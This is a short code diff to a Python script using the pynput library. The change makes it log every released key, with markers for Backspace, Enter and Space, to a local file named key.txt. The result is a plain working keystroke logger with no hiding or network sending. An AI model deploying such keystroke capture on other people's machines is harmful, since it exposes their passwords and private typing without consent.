@@ -1,16 +1,25 @@
 from pynput import keyboard 
+import os
 
 def on_press(key):
     if key == keyboard.Key.esc:
-        listener.stop()
-    
+        listener.stop()            
+        pass
+
     
 def on_release(key):
     try:
-        '''with open("key.txt",'a+') as f:
-            f.write(key.char)
-            f.close()'''
-        print(key.char,end='',flush=True)
+        with open("key.txt",'a+') as f:
+            if key == keyboard.Key.backspace:
+                f.write("(Backspace)")
+            elif key == keyboard.Key.enter:
+                f.write("(Enter)")
+            elif key == keyboard.Key.space:
+                f.write("(Space)")
+            else:
+                f.write(key.char)
+            f.flush()
+            f.close()
     except AttributeError:
         pass
 
